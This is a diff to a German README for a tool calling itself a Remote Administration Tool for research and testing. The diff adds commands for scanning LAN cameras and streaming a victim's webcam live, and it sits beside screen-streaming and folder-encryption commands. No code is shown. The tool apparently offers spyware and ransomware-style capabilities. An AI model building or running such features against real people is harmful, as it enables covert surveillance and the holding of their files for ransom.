@@ -38,6 +38,9 @@ Dieses Projekt ist ein Remote Administration Tool (RAT) für Forschungs- und Tes
 | `/restart`            | Client neustarten                                    |
 | `/screenstream_start` | Live-Screen starten                                  |
 | `/screenstream_stop`  | Live-Screen stoppen                                  |
+| `/scan_cameras`       | Suche nach Netzwerk-Kameras im LAN                   |
+| `/webcam_start`       | Live-Webcam-Stream starten                           |
+| `/webcam_stop`        | Live-Webcam-Stream stoppen                           |
 
 **Beispiel für Verschlüsselung/Entschlüsselung:**
 - `/encrypt C:\Users\test\Documents`
